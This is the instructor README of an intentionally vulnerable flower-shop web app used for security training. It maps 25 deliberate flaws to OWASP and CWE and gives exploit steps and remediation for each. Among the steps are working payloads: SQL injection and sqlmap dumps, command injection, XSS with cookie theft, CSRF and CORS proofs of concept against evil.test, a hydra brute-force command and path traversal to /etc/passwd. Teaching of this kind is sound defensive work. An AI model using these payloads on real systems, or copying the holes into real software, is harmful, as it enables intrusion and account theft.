# Petal & Stem — Vulnerable Flower Shop (Security Training Lab)

> ⚠️ **Intentionally vulnerable software.** Petal & Stem contains 25 deliberate security flaws. Run it only on an isolated lab machine or network. Never deploy it to the internet or on a network shared with production systems.
>
> 📕 **This README is the instructor copy.** It contains the full vulnerability matrix and solutions. Give students `STUDENT_BRIEF.md` instead.

---

## 1. Application overview

### Purpose
Petal & Stem is a realistic online florist used to teach web application security testing and secure coding. Every vulnerability sits inside a believable business feature, and each one is fenced by a server-side containment layer so it can only be exploited the way the lab intends.

**Difficulty:** Intermediate. Vulnerabilities are moderately hidden behind business features. Several chain together (for example, leaked credentials → back office → command injection).

### Features
| Area | Features |
|---|---|
| Storefront | Product catalogue with category filters, search and sorting; product pages with reviews; basket with promo codes; checkout with PDF invoices; public order tracking; custom bouquet requests with inspiration-photo preview; Petal Club members' area |
| Customer account | Order history and invoice downloads, profile, email and password changes, delivery and marketing preferences (JSON API), account closure, password reset by emailed code |
| Studio (staff) | Live order queue with status updates, low-stock alerts, custom request inbox, delivery hub connectivity check, activity log viewer |
| Admin | KPI dashboard with Chart.js revenue and category charts, best sellers, user management (roles, membership, activation), catalogue price and stock editing, lab-state reset |

### Architecture
```
 Browser ──HTTP──▶ Express app (Node 20, EJS views, Bootstrap 5.3)          
                     ├── routes/shop.js      catalogue, reviews, tracking, custom bouquet, members
                     ├── routes/auth.js      sign in, back-office sign in, register, password reset
                     ├── routes/cart.js      basket cookie, coupons, checkout, invoices
                     ├── routes/account.js   profile, email, password, invoice download
                     ├── routes/api.js       /api/v1 JSON (profile, orders, preferences)
                     ├── routes/staff.js     order queue, activity log, hub diagnostics
                     ├── routes/admin.js     dashboard, users, catalogue, lab reset
                     ├── routes/internal.js  loopback-only supplier sync, debug endpoint
                     └── lib/labContainment.js  server-side fences around each flaw
                              │
                              ▼  mysql2 pool (least-privilege user petal_app)
                         MySQL 8 / MariaDB  ── products, users, orders, reviews, coupons, sessions
```

### Technology stack
| Layer | Technology |
|---|---|
| Runtime | Node.js 20, Express 4.21 |
| Views | EJS 3.1, Bootstrap 5.3.3, Bootstrap Icons 1.11, Chart.js 4.4, jQuery 1.12.4 (deliberately outdated) |
| Data | MySQL 8.0 (Docker/Kubernetes) or MariaDB 10.11+ (VM), sessions stored in MySQL |
| Security libraries | helmet, express-rate-limit, hand-rolled synchroniser CSRF tokens |
| Fonts and images | DM Serif Display and Karla (self-hosted); photographs from Wikimedia Commons (see `ATTRIBUTIONS.md`) |
| Deployment | Docker Compose, Kubernetes (kustomize), Ubuntu/Debian VM with systemd |

All front-end libraries and fonts are bundled in `public/vendor`, so the lab runs without internet access.

---

## 2. Installation guide

### Prerequisites
| Mode | Requirements |
|---|---|
| Docker (recommended) | Docker Engine 24+ with the Compose plugin, 2 GB RAM free |
| Kubernetes | kind, minikube, k3s or any cluster; `kubectl` 1.27+; Docker to build the image |
| Local VM | Ubuntu 22.04/24.04 or Debian 12, root access, internet access during install |

### Default credentials
| Username | Password | Role | Notes |
|---|---|---|---|
| `admin` | `sunflower1` | admin | Petal Club member |
| `florist` | `Bloom2024!` | staff | Leaked in an HTML comment |
| `daisy` | `daisy123` | customer | Petal Club member, 4 orders |
| `jasper` | `password1` | customer | Not a member, 4 orders |
| `rosalind` | `rosebud` | customer | Not a member, 3 orders |

Working promo codes: `SPRING15`, `WELCOME10`. Test card: any 13–19 digit number, for example `4242 4242 4242 4242`.

### Seed data
`db/init.sql` creates the schema, 5 users, 14 products (one members-only), 5 reviews, 11 orders spread over the past 14 days (so the admin charts have data), 3 coupons and the least-privilege database account `petal_app` (SELECT/INSERT/UPDATE/DELETE on `petalstem.*` only, no FILE privilege). Invoices for seeded orders are generated as PDFs on first start.

---

## 3. Deployment instructions

### Docker (single command)
```bash
docker compose up -d --build
# open http://127.0.0.1:8080
```
The app port is bound to `127.0.0.1` only. MySQL takes 20–40 seconds to initialise on first run; the app waits and retries automatically.

Reset to a clean state at any time:
```bash
./scripts/reset-lab.sh docker
```

To serve students on an **isolated** lab network, change the port mapping in `docker-compose.yml` from `127.0.0.1:8080:3000` to `8080:3000`.

### Kubernetes (kind, minikube, k3s)
```bash
docker build -t petalstem-app:1.0 .
kind load docker-image petalstem-app:1.0          # kind
# minikube image load petalstem-app:1.0           # minikube
# docker save petalstem-app:1.0 | sudo k3s ctr images import -   # k3s

kubectl apply -k k8s/
kubectl -n petalstem-lab get pods -w
```
Open the app on NodePort `30080` (for kind, add an `extraPortMappings` entry for 30080, or use the node IP; for minikube run `minikube service -n petalstem-lab petalstem-app --url`).

> Use the NodePort, **not** `kubectl port-forward`. Port-forwarding connects from `127.0.0.1` inside the pod, which makes the loopback-only SSRF target directly reachable and spoils that exercise.

`k8s/networkpolicy.yaml` restricts the app's egress to the database and DNS, which stops SSRF from reaching cloud metadata services or other workloads (your CNI must enforce NetworkPolicy, e.g. Calico or Cilium). `k8s/init.sql` is a copy of `db/init.sql`; keep them in sync if you change the seed data. Reset with `./scripts/reset-lab.sh k8s`.

### Local VM (Ubuntu / Debian)
```bash
sudo ./scripts/install-vm.sh                    # serves on 127.0.0.1:3000
sudo LAB_BIND=0.0.0.0 ./scripts/install-vm.sh   # serves the isolated lab network
```
The script installs Node.js 20, MariaDB, `ping` and `iproute2`, loads the schema, copies the app to `/opt/petalstem`, and runs it as the unprivileged `petalstem` user under systemd (`journalctl -u petalstem -f` for logs). Re-running the script resets the database. On Windows Server, use Docker Desktop or WSL 2 with the Docker instructions.

### Manual (development)
```bash
npm install
mysql -uroot < db/init.sql
cp .env.example .env     # set DB_HOST etc.
npm start                # http://127.0.0.1:3000
```

### Verifying a deployment
`scripts/verify_lab.py` exploits all 25 vulnerabilities and checks every containment rule (68 checks). Run it against a **fresh** deployment, because it changes seeded passwords and places orders:
```bash
pip install requests
python3 scripts/verify_lab.py http://127.0.0.1:8080
# ... 68/68 checks passed
```
Then run `./scripts/reset-lab.sh` before students start.

---

## 4. Lab containment (instructor only)

These rules are enforced in `lib/labContainment.js` and are never mentioned in the UI. Rejected input gets a generic message ("Enter a valid hostname or IP address", "Your search contains characters that aren't allowed", "Invoice not found").

| Flaw | What works | What is blocked |
|---|---|---|
| XSS (reflected and stored) | Any payload without a script tag or `alert`, e.g. `<img src=x onerror=confirm(1)>`, `<svg onload=prompt(1)>`, `print()` | `<script>` in any case or spacing; the word `alert` including HTML-entity, `\u`, `\x` and `%` encoded forms |
| Path traversal | `/etc/passwd`, `/etc/hosts` (relative `../` or absolute) | Every other file outside the invoice folder: `/etc/shadow`, `.env`, source code, `/proc/*`, null-byte tricks |
| Command injection | `id`, `whoami`, `pwd`, `ip a` after `;` `|` `&` `&&` `||` or newline, or inside `$( )` / backticks | Any other command, any second injected command, redirection, comments, uppercase variants |
| Prototype pollution | The `isVip` gadget on `Object.prototype` | Every other polluted key is stripped, and built-ins are restored on every request, so the app cannot be crashed |
| SQL injection | UNION/boolean/time-based reads of the `petalstem` database | Stacked queries (`multipleStatements: false`), `LOAD_FILE` / `INTO OUTFILE` (no FILE privilege), writes outside the app's grants |
| SSRF | `http://` and `https://` URLs, including loopback | `file://`, `gopher://` and other schemes |

Other safeguards: the container runs as the unprivileged `node` user; the customer login is rate limited; all other forms carry CSRF tokens; all other SQL is parameterised and all other output is escaped; X-Frame-Options DENY everywhere except `/account`; generic error pages everywhere except the coupon handler. Prototype pollution affects every user until reset, so use **Admin → Dashboard → Reset lab state** between exercises.

---

## 5. Vulnerability matrix

Summary:

| # | OWASP 2025 | CWE | Vulnerability | Endpoint |
|---|---|---|---|---|
| 1 | A01 Broken Access Control | CWE-22 | Path traversal | `GET /account/invoices/download?file=` |
| 2 | A01 | CWE-352 | Cross-site request forgery | `GET/POST /account/email` |
| 3 | A01 | CWE-548 | Directory listing | `GET /backups/` |
| 4 | A01 | CWE-918 | Server-side request forgery | `POST /bouquet/preview` |
| 5 | A01 | CWE-615 | Secrets in source comments | `GET /login`, `/js/app.js` |
| 6 | A02 Security Misconfiguration | CWE-16 | CORS misconfiguration | `/api/v1/*` |
| 7 | A02 | CWE-526 | Environment variable exposure | `GET /debug/env` |
| 8 | A02 | CWE-1004 | Session cookie without HttpOnly | `bloom.sid` cookie |
| 9 | A03 Supply Chain Failures | CWE-1035 | Known-vulnerable component | jQuery 1.12.4 on every page |
| 10 | A03 | CWE-1395 | Vulnerable dependency (lodash 4.17.4) | `POST /api/v1/preferences` |
| 11 | A04 Cryptographic Failures | CWE-319 | Cleartext transmission | Whole site (HTTP, no HSTS) |
| 12 | A04 | CWE-328 | Reversible/weak hash (MD5) | `users.password_hash` |
| 13 | A05 Injection | CWE-77 | OS command injection | `POST /staff/diagnostics` |
| 14 | A05 | CWE-80 | Reflected XSS | `GET /shop?q=` |
| 15 | A05 | CWE-80 | Stored XSS | `POST /product/:slug/review` |
| 16 | A05 | CWE-89 | SQL injection | `GET /track?order=` |
| 17 | A06 Insecure Design | CWE-266 | Incorrect privilege assignment | `POST /register` |
| 18 | A06 | CWE-1021 | Clickjacking | `/account` |
| 19 | A07 Authentication Failures | CWE-287 | Improper authentication | `bloom_remember` cookie |
| 20 | A07 | CWE-308 | Single-factor auth, no lockout | `POST /backoffice/login` |
| 21 | A07 | CWE-384 | Session fixation | `GET /login?sid=` |
| 22 | A07 | CWE-640 | Weak password recovery | `POST /forgot/verify` |
| 23 | A08 Software or Data Integrity | CWE-565 | Unverified cookie data (price tampering) | `POST /checkout` |
| 24 | A09 Logging & Alerting Failures | CWE-532 | Sensitive data in logs | `logs/activity.log`, `GET /staff/logs` |
| 25 | A10 Exceptional Conditions | CWE-755 | Improper exception handling | `POST /cart/coupon` |

Flags: `FLAG{ssrf_reached_the_back_room}`, `FLAG{env_vars_are_not_a_vault}`, `FLAG{proto_pollution_bought_a_membership}`, `FLAG{admin_dashboard_reached}`.

### Details

#### 1. CWE-22 Path traversal
- **OWASP:** A01 · **File:** `routes/account.js` (`/invoices/download`), `lib/labContainment.js` (`resolveDownload`)
- **Endpoint:** `GET /account/invoices/download?file=INV-PS-10421.pdf` · **Attack surface:** authenticated customer, query parameter
- **Description:** The file name is joined to the invoice directory with `path.resolve` and no canonical-path check before serving.
- **Educational objective:** Recognise file-download parameters as traversal candidates; understand canonicalisation.
- **Validation:** Sign in as `daisy`, open `/account/invoices/download?file=../../../../etc/passwd` (or `file=/etc/hosts`).
- **Expected impact:** Disclosure of `/etc/passwd` and `/etc/hosts` (local accounts, internal host names).
- **Remediation:** Look invoices up by order ID owned by the user; never accept file paths. If paths are unavoidable, resolve and verify the result stays inside the base directory.

#### 2. CWE-352 Cross-site request forgery
- **OWASP:** A01 · **File:** `routes/account.js` (`router.all('/email')`), `lib/security.js` (`CSRF_EXEMPT`)
- **Endpoint:** `GET|POST /account/email` · **Attack surface:** any page the signed-in victim visits
- **Description:** The email-change endpoint is exempt from CSRF checks and also accepts GET. The session cookie has no explicit SameSite attribute.
- **Educational objective:** Identify state-changing requests without anti-CSRF tokens; build a PoC; understand SameSite behaviour.
- **Validation:** While signed in, load a PoC page served from the same host on another port (e.g. `python3 -m http.server 9000` → `http://127.0.0.1:9000/csrf.html`, which is same-site with the lab) containing `<img src="http://127.0.0.1:8080/account/email?email=attacker@evil.test">`. The account email changes. From a truly cross-site origin, use a top-level navigation instead (`<a href>` or `location=`), because browsers still send Lax cookies on top-level GET navigations.
- **Expected impact:** Account takeover: attacker changes email, then uses password reset (chains with #22).
- **Remediation:** Require a CSRF token on every state-changing request, accept only POST, set `SameSite=Lax` or `Strict` explicitly, re-authenticate for email changes.

#### 3. CWE-548 Directory listing
- **OWASP:** A01 · **File:** `server.js` (`serveIndex` on `/backups`) · **Folder:** `storage/backups/`
- **Endpoint:** `GET /backups/` (hinted in `/robots.txt`) · **Attack surface:** unauthenticated
- **Description:** A legacy backup folder is served with directory indexing.
- **Educational objective:** Use robots.txt and content discovery; recognise sensitive leftovers.
- **Validation:** Browse `/backups/`; download `petalstem_2024-03-01.sql.bak` and `nginx.conf.old`.
- **Expected impact:** Old MD5 hashes (florist's is still valid: crack to `Bloom2024!`), a retired staff coupon, and the internal `/internal/` path (SSRF hint).
- **Remediation:** Disable directory listing, keep backups out of the web root, delete stale files.

#### 4. CWE-918 Server-side request forgery
- **OWASP:** A01 · **File:** `routes/shop.js` (`/bouquet/preview`), target in `routes/internal.js`
- **Endpoint:** `POST /bouquet/preview` (JSON `{"url": ...}`, from the *Custom bouquet* page "Preview" button) · **Attack surface:** authenticated customer
- **Description:** The server fetches any http(s) URL and returns the body when it is not an image.
- **Educational objective:** Spot server-side fetch features; pivot to loopback-only services.
- **Validation:** Preview `http://127.0.0.1:3000/internal/inventory-sync`. Direct access from your browser returns 404.
- **Expected impact:** Supplier API key and `FLAG{ssrf_reached_the_back_room}`; also reach `/debug/env` via loopback.
- **Remediation:** Allow-list image hosts, resolve and reject private/loopback/link-local addresses (re-check after redirects), disable redirects, never echo non-image responses.

#### 5. CWE-615 Sensitive information in source comments
- **OWASP:** A01 · **Files:** `views/login.ejs` (HTML comment), `public/js/app.js` (JS comment)
- **Endpoint:** `GET /login` (view source), `GET /js/app.js` · **Attack surface:** unauthenticated
- **Description:** A developer TODO leaks back-office credentials; a JS comment reveals the internal sync URL and debug endpoint.
- **Educational objective:** Always review page source and client scripts.
- **Validation:** View source of `/login`: `florist / Bloom2024!`. Sign in at `/backoffice/login`.
- **Expected impact:** Staff access (order data, activity log, diagnostics → chains with #13 and #24).
- **Remediation:** Strip comments in build pipelines, secret-scan repositories, never put credentials in code.

#### 6. CWE-16 Configuration weakness: permissive CORS
- **OWASP:** A02 · **File:** `server.js` (`/api/v1` CORS middleware)
- **Endpoint:** `GET /api/v1/me`, `/api/v1/orders` · **Attack surface:** any origin the victim visits
- **Description:** The API reflects any `Origin` header and sets `Access-Control-Allow-Credentials: true`.
- **Educational objective:** Test CORS by sending a custom Origin header; write a cross-origin data-theft PoC.
- **Validation:** `curl -i -H "Origin: http://evil.test" -b "bloom.sid=..." http://127.0.0.1:8080/api/v1/me` returns `Access-Control-Allow-Origin: http://evil.test`. A PoC page on `http://127.0.0.1:9000` (same-site, different origin) running `fetch('http://127.0.0.1:8080/api/v1/me',{credentials:'include'})` can read the response.
- **Expected impact:** Theft of name, email, phone, address, preferences and order history.
- **Remediation:** Allow-list exact trusted origins; never combine reflected origins with credentials.

#### 7. CWE-526 Exposure of environment variables
- **OWASP:** A02 · **File:** `routes/internal.js` (`/debug/env`)
- **Endpoint:** `GET /debug/env` (hinted in robots.txt and app.js) · **Attack surface:** unauthenticated
- **Description:** A debug route returns `process.env` in full.
- **Educational objective:** Discover debug endpoints; understand why env vars are not a secret store.
- **Validation:** Open `/debug/env`.
- **Expected impact:** DB password, `SESSION_SECRET` (enables forging signed session cookies), supplier and payment keys, `FLAG{env_vars_are_not_a_vault}`.
- **Remediation:** Remove debug routes in production builds; use a secrets manager; never return environment data.

#### 8. CWE-1004 Sensitive cookie without HttpOnly
- **OWASP:** A02 · **File:** `server.js` (`session({ cookie: { httpOnly: false } })`)
- **Endpoint:** every response that sets `bloom.sid` · **Attack surface:** any XSS
- **Description:** The session cookie is readable from JavaScript.
- **Educational objective:** Inspect cookie flags; chain with XSS for session hijacking.
- **Validation:** In DevTools run `document.cookie` → includes `bloom.sid`. Chain with stored XSS: `<img src=x onerror="fetch('http://localhost:9000/?c='+document.cookie)">`.
- **Expected impact:** Session hijacking of any user who views the payload, including staff.
- **Remediation:** `HttpOnly; Secure; SameSite=Lax` on session cookies.

#### 9. CWE-1035 Using components with known vulnerabilities
- **OWASP:** A03 · **Files:** `public/vendor/jquery-1.12.4.min.js`, `views/partials/footer.ejs`
- **Endpoint:** every page · **Attack surface:** client-side library
- **Description:** jQuery 1.12.4 is affected by CVE-2015-9251, CVE-2019-11358 and CVE-2020-11022/11023.
- **Educational objective:** Fingerprint client libraries and map versions to CVEs.
- **Validation:** Check the script URL or run `jQuery.fn.jquery` in the console; scan with Retire.js, Wappalyzer or Burp's vulnerable JS library check.
- **Expected impact:** Latent XSS and prototype-pollution risk wherever jQuery processes untrusted data.
- **Remediation:** Upgrade to jQuery 3.7+ (or remove it), use SCA in CI, maintain an SBOM.

#### 10. CWE-1395 Dependency on vulnerable third-party component (lodash 4.17.4)
- **OWASP:** A03 · **Files:** `package.json` (`lodash: 4.17.4`), `routes/api.js` (`_.merge` in `POST /preferences`)
- **Endpoint:** `POST /api/v1/preferences` (JSON, needs the page's CSRF token header) · **Attack surface:** authenticated customer
- **Description:** User JSON is deep-merged with lodash 4.17.4 (CVE-2018-3721 / CVE-2018-16487), so `__proto__` pollutes `Object.prototype`. Membership is checked with `user.isVip`, which falls through to the polluted prototype.
- **Educational objective:** Run `npm audit`; understand prototype pollution and gadget hunting.
- **Validation:** Signed in as `jasper`, in DevTools on `/account`: `fetch('/api/v1/preferences',{method:'POST',headers:{'Content-Type':'application/json','X-CSRF-Token':'<token from page source>'},body:'{"__proto__":{"isVip":true}}'})`. Visit `/members`.
- **Expected impact:** Petal Club access and 15% discount **for every user**, members-only products, `FLAG{proto_pollution_bought_a_membership}`. Reset via Admin → Reset lab state.
- **Remediation:** Upgrade lodash to 4.17.21+, reject `__proto__`/`constructor`/`prototype` keys, validate JSON against a schema, use `Object.create(null)` or `Map` for lookup objects.

#### 11. CWE-319 Cleartext transmission of sensitive information
- **OWASP:** A04 · **File:** `server.js` (helmet with `strictTransportSecurity: false`, no TLS), `docker-compose.yml`
- **Endpoint:** whole site, especially `POST /login`, `POST /checkout` · **Attack surface:** network path
- **Description:** Credentials and card numbers travel over plain HTTP, with no HSTS and no HTTPS redirect.
- **Educational objective:** Capture and read credentials on the wire.
- **Validation:** Capture with Wireshark (`tcp.port == 8080 && http.request.method == "POST"`) while signing in; read `username=...&password=...`.
- **Expected impact:** Credential and payment-card interception by anyone on the network path.
- **Remediation:** TLS everywhere, HSTS, `Secure` cookies, redirect HTTP to HTTPS.

#### 12. CWE-328 Reversible / weak one-way hash
- **OWASP:** A04 · **File:** `lib/security.js` (`hashPassword`), `db/init.sql` (`MD5()`)
- **Endpoint:** storage of all passwords; exposed via #16 and #3 · **Attack surface:** database
- **Description:** Passwords are unsalted MD5.
- **Educational objective:** Crack weak hashes; understand salting and slow KDFs.
- **Validation:** Dump hashes with #16, then `hashcat -m 0 hashes.txt rockyou.txt` or an online lookup. `admin` → `sunflower1`.
- **Expected impact:** Plaintext passwords for every account, including admin.
- **Remediation:** Argon2id or bcrypt with per-user salts; force resets after migration.

#### 13. CWE-77 Command injection
- **OWASP:** A05 · **Files:** `routes/staff.js` (`POST /diagnostics`), `lib/labContainment.js` (`buildPing`)
- **Endpoint:** `POST /staff/diagnostics` · **Attack surface:** staff account (get it via #5, #12, #17, #19)
- **Description:** The hub hostname is concatenated into a `ping` shell command.
- **Educational objective:** Identify shell-backed features; use separators and command substitution.
- **Validation:** As `florist`, Studio → Hub diagnostics, enter `127.0.0.1; id` (also `| whoami`, `&& pwd`, `; ip a`, `$(whoami)`).
- **Expected impact:** Command execution as the app's OS user (`node` in Docker), network reconnaissance via `ip a`.
- **Remediation:** Use `execFile` with an argument array, strict hostname validation, or a native ICMP library — never a shell.

#### 14. CWE-80 Reflected XSS
- **OWASP:** A05 · **Files:** `routes/shop.js` (`/shop`), `views/shop.ejs` (`<%- term %>`)
- **Endpoint:** `GET /shop?q=` · **Attack surface:** crafted link
- **Description:** The search term is echoed unencoded after a naive keyword blocklist.
- **Educational objective:** Find reflections; bypass a blocklist filter.
- **Validation:** `/shop?q=<img src=x onerror=confirm(document.domain)>`. (`<script>` and `alert` are filtered: students must find alternatives.)
- **Expected impact:** Script execution in the victim's session; cookie theft via #8.
- **Remediation:** Context-aware output encoding (`<%= %>`), a strict Content-Security-Policy, no blocklists.

#### 15. CWE-80 Stored XSS
- **OWASP:** A05 · **Files:** `routes/shop.js` (`/product/:slug/review`), `views/product.ejs` (`<%- r.body %>`)
- **Endpoint:** `POST /product/:slug/review`, rendered on `GET /product/:slug` · **Attack surface:** any signed-in customer
- **Description:** Review text is stored and rendered raw for every visitor.
- **Educational objective:** Persistent XSS and its reach compared with reflected XSS.
- **Validation:** Post a review `<svg onload=confirm(document.cookie)>` on any product; reload the product page in another browser.
- **Expected impact:** Mass session theft of every visitor, including staff and admins.
- **Remediation:** Encode output, sanitise any rich text with an allow-list sanitiser (DOMPurify), add CSP.

#### 16. CWE-89 SQL injection
- **OWASP:** A05 · **File:** `routes/shop.js` (`/track`, string-concatenated query)
- **Endpoint:** `GET /track?order=` · **Attack surface:** unauthenticated
- **Description:** The order number is concatenated into a 5-column SELECT.
- **Educational objective:** Detect, enumerate columns, UNION-extract data; use sqlmap responsibly.
- **Validation:** `/track?order=' UNION SELECT username,password_hash,email,role,id FROM users-- -`. Or `sqlmap -u "http://127.0.0.1:8080/track?order=PS-10421" --batch -D petalstem --dump`.
- **Expected impact:** Full read of the shop database (users, hashes, orders, addresses). File reads and stacked queries are blocked by DB privileges.
- **Remediation:** Parameterised queries everywhere; least-privilege DB accounts (as already applied).

#### 17. CWE-266 Incorrect privilege assignment
- **OWASP:** A06 · **Files:** `routes/auth.js` (`POST /register`), `views/register.ejs` (hidden `role` field)
- **Endpoint:** `POST /register` · **Attack surface:** unauthenticated
- **Description:** The server trusts a client-supplied `role` field (mass assignment).
- **Educational objective:** Tamper with hidden fields in an intercepting proxy.
- **Validation:** Register with Burp intercepting; change `role=customer` to `role=admin`. Visit `/admin`.
- **Expected impact:** Full admin access: all customers' data, roles, catalogue, `FLAG{admin_dashboard_reached}`.
- **Remediation:** Assign roles server-side only; allow-list accepted fields.

#### 18. CWE-1021 Improper restriction of rendered UI layers (clickjacking)
- **OWASP:** A06 · **File:** `server.js` (`/account` removes `X-Frame-Options`; no CSP `frame-ancestors`)
- **Endpoint:** `/account` (Close account, Change password, Update email) · **Attack surface:** attacker page framing the account area
- **Description:** The account area can be framed by any site.
- **Educational objective:** Build a clickjacking PoC with an invisible iframe.
- **Validation:** Host `<iframe src="http://127.0.0.1:8080/account#settings" style="opacity:0.05;position:absolute;width:1200px;height:1400px">` with a decoy "Claim your free bouquet" button positioned over **Close my account**.
- **Expected impact:** Victim closes their own account (admin can reactivate) or submits other account actions.
- **Remediation:** `X-Frame-Options: DENY` and `Content-Security-Policy: frame-ancestors 'none'` on every page.

#### 19. CWE-287 Improper authentication
- **OWASP:** A07 · **Files:** `routes/auth.js` (sets `bloom_remember`), `server.js` (trusts it)
- **Endpoint:** any page with a `bloom_remember` cookie · **Attack surface:** client-controlled cookie
- **Description:** "Keep me signed in" stores `base64(username|timestamp)` with no signature; the server logs in whoever it names.
- **Educational objective:** Decode and forge tokens; understand signing/HMAC.
- **Validation:** Sign in with "Keep me signed in", base64-decode the cookie, replace the username with `admin`, re-encode (`echo -n 'admin|0' | base64`), clear `bloom.sid`, reload `/admin`.
- **Expected impact:** Log in as any user without a password.
- **Remediation:** Random, server-stored, hashed remember-me tokens bound to the user and rotated on use.

#### 20. CWE-308 Use of single-factor authentication
- **OWASP:** A07 · **File:** `routes/auth.js` (`POST /backoffice/login`)
- **Endpoint:** `POST /backoffice/login` · **Attack surface:** unauthenticated
- **Description:** Staff and admin accounts use only a password, with no rate limit or lockout (unlike the customer login).
- **Educational objective:** Credential brute-forcing; why privileged accounts need MFA.
- **Validation:** Load `/backoffice/login`, note the `bloom.sid` cookie and `_csrf` value (the token is fixed per session), then run Burp Intruder on the password field, or `hydra -l admin -P rockyou.txt -s 8080 127.0.0.1 http-post-form "/backoffice/login:_csrf=TOKEN&username=^USER^&password=^PASS^:Incorrect:H=Cookie\: bloom.sid=SESSION"`. Finds `sunflower1`; no lockout or 429 ever appears.
- **Expected impact:** Admin account takeover.
- **Remediation:** MFA for privileged roles, rate limiting, lockout/backoff, breached-password checks.

#### 21. CWE-384 Session fixation
- **OWASP:** A07 · **Files:** `server.js` (`/login?sid=` handler), `routes/auth.js` (no `session.regenerate` on customer login)
- **Endpoint:** `GET /login?sid=<cookie value>` then `POST /login` · **Attack surface:** crafted "magic sign-in link"
- **Description:** The app sets the session cookie from a URL parameter and keeps the same session ID after sign-in.
- **Educational objective:** Understand why session IDs must change at privilege boundaries.
- **Validation:** Visit `/login` in browser A and copy `bloom.sid`. In browser B open `/login?sid=<that value>` and sign in as `rosalind`. Reload `/account` in browser A: you are Rosalind.
- **Expected impact:** Hijack the victim's authenticated session.
- **Remediation:** `req.session.regenerate()` on login (as the back-office login already does); never accept session IDs from URLs.

#### 22. CWE-640 Weak password recovery mechanism
- **OWASP:** A07 · **File:** `routes/auth.js` (`POST /forgot`, `POST /forgot/verify`)
- **Endpoint:** `POST /forgot/verify` · **Attack surface:** unauthenticated
- **Description:** Reset codes are 4 digits (10,000 possibilities), valid for 30 minutes, with unlimited attempts. Codes are "emailed" to the server console.
- **Educational objective:** Brute-force a short OTP; design secure recovery.
- **Validation:** Request a reset for `jasper`; brute-force `/forgot/verify` with codes 0000–9999, keeping the same session cookie and CSRF token (Burp Intruder or Turbo Intruder, `ffuf -w codes.txt -X POST ...`, or a short Python loop; Burp Community's throttling makes 10,000 requests slow). A 302 redirect marks the right code.
- **Expected impact:** Takeover of any account, including admin.
- **Remediation:** Long random single-use tokens sent by link, attempt limits, short expiry, notify the account owner.

#### 23. A08 — CWE-565 Reliance on cookies without validation and integrity checking
- **OWASP:** A08 · **Files:** `lib/cart.js` (`readCart`), `routes/cart.js` (`POST /checkout` uses cookie prices)
- **Endpoint:** `bloom_cart` cookie → `POST /checkout` · **Attack surface:** authenticated customer
- **Description:** The basket, including unit prices, lives in an unsigned base64 JSON cookie and checkout trusts those prices.
- **Educational objective:** Decode and tamper client-side state; understand integrity verification.
- **Validation:** Add roses to the basket, base64-decode `bloom_cart`, set `"price":0.01`, re-encode, check out. The invoice shows $0.01 roses.
- **Expected impact:** Buying any product at any price.
- **Remediation:** Keep the cart server-side (or sign it with HMAC) and always recalculate prices from the database.

#### 24. CWE-532 Insertion of sensitive information into log files
- **OWASP:** A09 · **Files:** `lib/logger.js`, `routes/auth.js` (`activity('LOGIN', {... password ...})`), `routes/cart.js` (full card number)
- **Endpoint:** `logs/activity.log`, viewable at `GET /staff/logs` · **Attack surface:** staff account, server/container logs (`docker logs petalstem-app`)
- **Description:** Every sign-in attempt logs the plaintext password; every order logs the full card number.
- **Educational objective:** Review logs for secrets; understand log hygiene and PCI DSS.
- **Validation:** As `florist`, open Studio → Activity log. Look for `password=` entries, including the admin's.
- **Expected impact:** Credential and card-number disclosure to anyone with log access; privilege escalation from staff to admin.
- **Remediation:** Never log secrets or PANs; redact by allow-list; restrict log access; alert on auth anomalies.

#### 25. CWE-755 Improper handling of exceptional conditions
- **OWASP:** A10 · **Files:** `routes/cart.js` (`POST /cart/coupon` catch block), `views/debug-error.ejs`
- **Endpoint:** `POST /cart/coupon` · **Attack surface:** any visitor with a basket
- **Description:** The coupon is passed through `decodeURIComponent`. Malformed percent-encoding throws a `URIError`, and the handler renders the stack trace and internal context.
- **Educational objective:** Fuzz inputs for unhandled exceptions; recognise information leakage in errors.
- **Validation:** Enter `%E0%A4%A` (or just `%`) as a promo code.
- **Expected impact:** Stack trace, file paths, Node version, process ID, DB host, user and database name, internal query.
- **Remediation:** Validate input before processing, handle expected errors explicitly, return generic errors, log details server-side only.

---

## 6. Lab exercises

### Suggested student exercises
1. **Recon:** map the app, read `robots.txt`, view page sources and client scripts. Find the leaked credentials, the backup folder and the debug endpoint (#3, #5, #7, #9).
2. **Injection:** dump the users table from the order tracker and crack the hashes (#16, #12).
3. **Client-side:** get JavaScript running through the search box and through a review, despite the filter. Steal a session cookie (#14, #15, #8).
4. **Access control:** read system files from the invoice download and reach an internal service from the custom bouquet page (#1, #4).
5. **Authentication:** become the admin four different ways (#17, #19, #20, #22) and hijack a session (#21).
6. **Business logic:** buy the Bridal Blush Bouquet for one cent, and join Petal Club without an invitation (#23, #10).
7. **Back office:** from the florist account, run commands on the server and escalate to admin using what the logs reveal (#13, #24).
8. **Cross-site:** build PoC pages for CSRF, CORS data theft and clickjacking (#2, #6, #18).
9. **Errors and transport:** trigger a debug error, then capture credentials in Wireshark (#25, #11).
10. **Capstone chain:** unauthenticated → staff → admin with no seeded passwords from this README.

### Learning objectives
- Map each finding to OWASP Top 10 2025 and the correct CWE.
- Distinguish reflected from stored XSS and bypass naive blocklists responsibly.
- Chain low-severity findings into high-impact attack paths.
- Explain business-logic and integrity flaws that scanners miss.
- Write clear findings with evidence, impact and remediation.
- Fix each flaw in code and confirm the fix.

### Verification procedure
1. Students record each finding with request/response evidence and the flag where applicable.
2. Instructor runs `scripts/verify_lab.py` on a clean instance to confirm all 25 work, then compares student evidence with section 5.
3. For secure-coding courses, students patch a flaw and the matching check in `verify_lab.py` must then **fail** while the rest of the app keeps working.

### Recommended tooling
Burp Suite Community/Pro or OWASP ZAP · browser DevTools · sqlmap · hashcat or John the Ripper · hydra or Burp Intruder · ffuf / gobuster / dirsearch · Retire.js and `npm audit` · Wireshark · `curl` and a small Python HTTP server for PoC pages.

### Secure coding remediation guidance
Each finding in section 5 lists its remediation. As a project-wide checklist: parameterise every query; encode all output and add a CSP; put a CSRF token on every state-changing route; regenerate sessions at login and set `HttpOnly; Secure; SameSite`; hash passwords with Argon2id or bcrypt; keep prices and roles server-side; remove debug routes and secret comments; serve only over TLS with HSTS; restrict CORS to known origins; deny framing; never shell out with user input; keep dependencies patched with SCA in CI; never log secrets; return generic errors.

---

## 7. Project layout
```
server.js                 app setup, middleware, routing
lib/                      db, security helpers, cart, logger, PDF invoices, labContainment
routes/                   shop, auth, cart, account, api, staff, admin, internal
views/                    EJS templates (storefront, account, staff/, admin/, partials/)
